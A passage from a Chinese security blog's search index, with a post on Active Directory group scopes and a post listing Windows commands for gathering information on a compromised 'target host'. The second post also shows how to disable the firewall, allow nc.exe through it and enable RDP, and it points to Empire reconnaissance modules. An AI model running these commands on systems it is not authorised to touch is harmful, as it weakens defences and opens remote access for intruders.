id="域内的各种权限">域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。<br><strong>域本地组</strong><br>成员范围：所有的域；使用范围：自己所在的域<br><strong>全局组</strong><br>成员范围：自己所在的域；使用范围：所有的域<br><strong>通用组</strong><br>成员范围：所有的域；使用范围：所有的域<br><strong>A-G-DL-P 策略</strong><br>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概念解读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地工作组信息收集</title>
      <link href="/2022/10/12/Working_Group_Information_Gathering/"/>
      <url>/2022/10/12/Working_Group_Information_Gathering/</url>
      
        <content type="html"><![CDATA[<h3 id="手动收集本地工作组信息">手动收集本地工作组信息</h3><ul><li>查看当前权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><ul><li>本机网络配置信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（英文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（中文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><ul><li>查看系统体系结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><ul><li>查看系统所有环境变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><ul><li>查看安装的软件及版本和路径等信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><ul><li>利用 PowerShell 收集软件版本信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><ul><li>查询本机服务信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><ul><li>查询进程列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><ul><li>wmic 查看进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看启动程序信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><ul><li>查看计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><ul><li>查看主机开启时间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><ul><li>查询用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><ul><li>查看指定用户的信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><ul><li>查看本地管理员用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><ul><li>查看当前在线用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><ul><li>列出或断开本地计算机和连接的客户端的会话</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><ul><li>查看端口列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><ul><li>查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li>查看本机共享</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看共享列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><ul><li>查询路由表及所有可用接口的ARP 缓存表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp –a</span><br></pre></td></tr></table></figure><ul><li>查询防火墙相关配置<ul><li>关闭防火墙</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)</span><br><span class="line">netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</span><br></pre></td></tr></table></figure><ul><li>查看防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(Windows Server 2003 系统及之前版本)</span><br><span class="line">允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">(Windows Server 2003 之后系统版本)</span><br><span class="line">允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许 3389 端口放行</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><ul><li>自定义防火墙日志储存位置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log</span><br></pre></td></tr></table></figure><ul><li>查看计算机代理配置情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><ul><li>查询并开启远程连接服务<ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h3 id="自动收集本地工作组信息">自动收集本地工作组信息</h3><ul><li>wmic脚本</li></ul><p><a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic 脚本下载地址</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><ul><li>PowerShsell Empire</li></ul><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</li><li>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</li></ul><p>当使用 Empire 使主机上线后，可调用powershell/situational_awareness/host/winenum模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p>调用powershell/situational_awareness/host/computerdetails模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><div id="posts-calendar" class="js-pjax"></div>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>七夕有必要给喜欢的女人发红包吗？</title>
      <link href="/2022/10/12/1/"/>
      <url>/2022/10/12/1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6819de695d91336637c117bd697afcbd382e199b24fee300a89e8b53d60b03a7">83e4f756d680019cc75bb3d7e0230dd0c5737f3dfb1f86c440806aadc96c8ae2cca5df22d529a638103b89ffd58a9daed54966269becbda3b0c231d9478ebd339ee1fac9cb20fd47f8a91afbcf34918c97f8d690e1ddb6eba65ea92f762970263a1125ff30da8a98c468f2cc79d54e4b030e7aa80a3306ab139614289ac6d3dc00e371627ec9bae3dc88041bee945483ab30eeb7219b4ec74492b799e3dd411d3184170748ce092ba79a0399c5237278caa436cd0a22ebd3298963d60337e8b08b214a7efb250835dd60102c7a98df2599f9adc5fe458c99154bb4b4526a900c81a50ae9e82aeb1edd10214b189cc85a2957536e763f2574d3756a9e4c3c000add52a079baea027a959ccad98f7670195dd105bd6ef634006f5edddb83abc3e9e0602b96754e479cae4a01c21e0bee7f34fd252deee82252a2fc2a6e3d9cc0b2ae8d44c7d658592c9c4abf1f93a9aff08e0c8b2d81fc0d2cf52944e17ca18479c7031818e63cd558e95c079a092413d2afa1df5fa45a45a2d3b0ceefd6fbf0daf0abbbf67cc9e895f1cfcdbf28c14cbe87e3363af543451b3b66182f0c00c80ff9dd5786988faf7621928bd8e623b3a9df205e3ddc8078ddc273869e483e150a25e20b6645f546c1a4211ad14660308d938cad7ef5543601dbfc512546e59cc5e366cb82804fa042a4e60072962469f57796ec29c041bc01e84ea3849c4aa4c57b22c102f71be72123daf712903d71df2b0167c3d01c7e98da1c7f34b64e12177734f40d37a4127b5bd9a14205df423a11cc614234a6ec863bcca9fab7da0614f905982239199d1f35813ebd8ec1d5f5ac791f51402b8d2099d13e2a968e2c7f6fe7eaf70a33c4455932780dce98f69b4891584a70aa5b900f5cffd59ecc11b13c399c8e1e706c85b9e4262e9b7e97d8a416a157ace528234ab67b708c184cd349994f482c1f66612b0ab751577015ccb7ce25ec8d7c4a615dbd952f421b578d9f9f95842ab204b42645f85eac6b658cb6f001e7b929743bd5e116dd617ff867265c62d809d7b4c52a8ce262c1697a220017049929b72a8802d585fe28e332408cbc607b641b8e60f92cd1d494ffaf8b833a1b49fa0e4c4126848138b848e8db799249fd7b6cc6ed37f2065c62e371304fe3d729a18976b501a82ac1cad89b8155ab2d0157b0c43d21931a1e1def110c58714a853a4d9420fbb5cb81562041b11e509476cc2ed4a03374b1bf2abea2f65d4bd1673c3d5015904efcf0b7cabee1fbe2d904342d062b50c98c4e9b5c73245b84e8dccbe5f8a94fd68c9bb32bac4edb0793334d84e06f6e508751f3d9385acde84aa2c3271cfd242e1162d2a77dfd08cfa81b8a2c8ed25863f4ca60b2a81619dae9ceed3207b40a202f3f7b37656f4f995664d9b94b78d1784ff20d8999569bbf90d6a0dffef9e7027070002e9b93e2b7c89598af5a845916868ebb1e2323fcce099cc03330b8ef9ae9a8d936c81fbf5df389c386301d9907e43c0528145a5903a886ca1140d3ca6c6ec7b50ec4e1f5a0204df20174e4e03432db32defada4bf869bd9f3a5c5feb558f3c7091e0461f3f6e0e6da7514e98224ae2f755c365333e6e64b3d14d3e7db7b003a11cd4baec764ff53146046d865e0385169655a771f08935fa01a932c6888b8b13ebea8a42e60fc8066d2a38e49affa5dd9a50f7ec387ecd64b1cb8da275932a2c5c9e2e8f9342b7b232eae389c8172e5282dfb7a1a489e439bdbe149da40d32f93f3f627344ec4d31effa1c9cf8e3dbc0cdac36aac474e0dcb411f28b21d46f77037c3ec4b069654f68b97e6e9fc6ea22a4a24ed9d3823246898ad941defb661133768bd689724edda4935619c05bad5ec39d99583201965de1827cb12825062b10b44c5d5a0bd68a3a18d9275f9188dd8f2f59e3dd3a67ca5d792f67bb844ecf2a143cf6a273b4077d22a67b4a4d3f75399ec82753196dc5a3791ea881311dbecf93d8f359efe88f2b9206433baea237f86f0b235722447764a226e4d17d9a4e39f45298dac5df636119ae9a2506d964784374bf155d49a285a4562bb4a4c0977eeaf32a0b808de2b3245957f9b2660d72057c26fb8cc6d22db24e6ffea1adf972c473a5ce1bcfdc862b42824f559db290ff2c9b0fb0edbe569079b0073b9e4a3b96b7cfd71fa2fb558ef5cc7c0231504526cf76c52b83d7ad8fd4ef030228aeae77f36acd04da0dc13e4aadfdca295a14eb56951b093a88e081b142043a0903b160afa9183ec0405c8c17b49f5b6d51d1ec57174ab4f3483369f15bc1fbf5f2590a996ee50c849f5ca81b173fd51f365929f57b7df109d06a98318d71754d5aa13134e2d65c012189421dc63dad96d897128c7bfa8a9b4b27f00f9e4bc02b53fcf098b8a5083e5ebd9330da86fae88b6ebe9cf6b5325d5ad1f57691a71037426d93a627a334ec76146df7be277bb8a15b2fa7f4e2bcf42631d1433e421e985a35ab5185336a92145263977fd05baba60eaa2e6867d88e87619473fea22d6f88dac15e0cc6a5101cce42fececfb49363b96ed5504c98cdebf70f50d328f223f20f32a8edb55f1654989df2a47855f4d2cedf361915b2ece0eb0f26aa31dfa4f9e88ebba7689e5d7d12c942d05b256d90a2e9609208ae7d0f47ba0a8daa238b9a807d907c650876d1d90265f50a0d4d87ab7aeb21feea5c72ee3e135035a313d9b5f7380b8fbbaed6b7e5d01b28d8c25605fa343e58b8cb0f9bd63381a31a02a27522f569c3f7374b4a78e937bfab8610b73de24095c0dcad75a66a53565e46b65c6cea30123a129f150763be00360250bf8441fa5cc2c521db64fd58d4c1bb6fa3c9f08220efd11f5a5da6762d6a71321ace264c30f72e4714ff21f9fa298d1863c306241d03a98bffb408c33902037d979f63ecfe10022c33ab1778e08c924f9d4ab6bc924b5c450a3ea78ac39e81f4ea7cfd1d63b93bfd433aea77fe0c66cc362f281b8d5efc82a59b7ae175452dbc553f4605d851162a12d24d203c9637930bbd86aa90bbb4a705d8bff82d9a17abdcfebc9fc06f3b8cdf8e74e7050ca3fbe72cfb77b30657068343148cdc4b78380e32f9d8766d81bf8ba03d0ae079dfafc3c1e9da15ef603a1bfa48077e1afa95c897f0cc65b1d822b1e5c4a380f3aa1cf01ba61872344b19879ea28038599c608a93f8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入加密密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 情感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 七夕 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
